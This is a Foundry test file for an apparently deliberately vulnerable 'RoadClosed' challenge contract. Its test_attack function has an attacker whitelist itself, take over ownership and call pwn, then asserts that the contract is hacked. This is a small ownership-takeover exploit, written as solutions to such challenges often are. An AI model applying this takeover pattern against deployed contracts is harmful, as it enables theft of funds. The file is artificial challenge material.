// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {RoadClosed} from "../src/RoadClosed.sol";

contract RoadClosedTest is Test {
    RoadClosed public target;
    address owner;
    address attacker;

    function setUp() public {
        owner = makeAddr("owner");
        attacker = makeAddr("attacker");
        vm.startPrank(owner);
        target = new RoadClosed();

        //owner == owner
        assertEq(target.isOwner(), true, "Wrong init owner");
        assertEq(target.isHacked(), false, "Wrong hacked status");
        vm.stopPrank();
    }

    function test_attack() public {
        // ATTACK
        vm.startPrank(attacker);
        target.addToWhitelist(attacker);
        target.changeOwner(attacker);
        target.pwn(attacker);

        // CHECK
        //owner == attacker
        assertEq(target.isOwner(), true, "Attacker is not an owner");
        assertEq(target.isHacked(), true, "Contract is not hacked");
        vm.stopPrank();
    }
}
